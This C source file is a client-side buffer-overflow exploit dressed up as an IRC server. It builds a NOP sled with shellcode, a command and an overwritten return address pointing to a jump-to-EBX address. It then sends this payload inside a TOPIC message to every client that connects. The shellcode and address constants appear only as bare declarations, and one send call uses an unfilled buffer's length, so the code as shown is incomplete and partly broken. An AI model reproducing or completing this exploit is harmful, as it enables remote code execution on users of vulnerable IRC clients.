#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_port; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  serv_addr ;
typedef  int /*<<< orphan*/  cli_addr ;

/* Variables and functions */
 size_t BUFEND ; 
 size_t CMDLENP ; 
 char* COMMAND ; 
 scalar_t__ EINTR ; 
 char* FUNC ; 
 int /*<<< orphan*/  INADDR_ANY ; 
 size_t JMPADR ; 
 char JMPOFS ; 
 char JMPS ; 
 int JMP_EBX_ADR ; 
 char* JOIN1 ; 
 char* JOIN2 ; 
 int /*<<< orphan*/  NOP ; 
 char* OPENING_MSG ; 
 int /*<<< orphan*/  PF_INET ; 
 int /*<<< orphan*/  PORT ; 
 int RETADR ; 
 int /*<<< orphan*/  SIGCHLD ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int accept (int,struct sockaddr*,int*) ; 
 scalar_t__ bind (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  bzero (char*,int) ; 
 int /*<<< orphan*/  close (int) ; 
 scalar_t__ errno ; 
 int /*<<< orphan*/  exit (int) ; 
 char* exploit_code ; 
 int fork () ; 
 int /*<<< orphan*/  handleSIGCHLD ; 
 int /*<<< orphan*/  htonl (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  htons (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  listen (int,int) ; 
 int /*<<< orphan*/  memset (char*,int /*<<< orphan*/ ,size_t) ; 
 int /*<<< orphan*/  perror (char*) ; 
 int /*<<< orphan*/  send (int,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  signal (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  sleep (int) ; 
 int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  sprintf (char*,char*,char*) ; 
 int /*<<< orphan*/  strcat (char*,char*) ; 
 int strlen (char*) ; 
 int /*<<< orphan*/  strncpy (char*,char*,int) ; 

int main(int argc, char *argv[])
{
    int     serv_sock,cli_sock;
    int     pid,clilen,p,ip;
    char    buff[30000],jank[10000];
    struct  sockaddr_in serv_addr;
    struct  sockaddr_in cli_addr;
    
    signal( SIGCHLD, handleSIGCHLD );

    memset(jank,NOP,BUFEND);
    strcat(exploit_code,FUNC);
    strcat(exploit_code,COMMAND);
    exploit_code[CMDLENP]=strlen(COMMAND);
    strncpy(jank+RETADR+4,exploit_code,strlen(exploit_code));

    ip=JMP_EBX_ADR;
    jank[JMPADR]  =JMPS;
    jank[JMPADR+1]=JMPOFS;
    jank[RETADR+3]=0xff&(ip>>24);
    jank[RETADR+2]=0xff&(ip>>16);
    jank[RETADR+1]=0xff&(ip>>8);
    jank[RETADR]  =ip&0xff;
    jank[BUFEND]  =0;

    if((serv_sock=socket(PF_INET,SOCK_STREAM,0))<0){
        perror("socket");
        exit(1);
    }
    bzero(( char *)&serv_addr, sizeof(serv_addr));
    serv_addr.sin_family        = PF_INET;
    serv_addr.sin_addr.s_addr   = htonl(INADDR_ANY);
    serv_addr.sin_port          = htons(PORT);
    if(bind(serv_sock,(struct sockaddr *)&serv_addr,sizeof(serv_addr))<0){
        perror("bind");
        exit(1);
    }
    listen(serv_sock,5 );
    
    while(1){
        clilen   = sizeof(cli_addr);
        cli_sock = accept(serv_sock,(struct sockaddr *)&cli_addr,&clilen);
        if( cli_sock<0){
            if(errno==EINTR) continue;
            perror("accept" );
            exit(1);
        }
        if((pid=fork())<0){
            perror( "fork" );
            exit(1);
        }
        if(pid==0){
            close(serv_sock);
            send(cli_sock, OPENING_MSG, strlen(OPENING_MSG),0);
            send(cli_sock, JOIN1, strlen(JOIN1),0);
            send(cli_sock, "\n",1,0 );
            send(cli_sock, JOIN2, strlen(buff),0);
            sprintf( buff, ":fucker!~fuck@127.0.0.1 TOPIC #fuck :%s\n", jank );
            send(cli_sock, buff, strlen(buff),0);
            sleep(1800);
            exit(0);
        }else
            close(cli_sock);
    }
}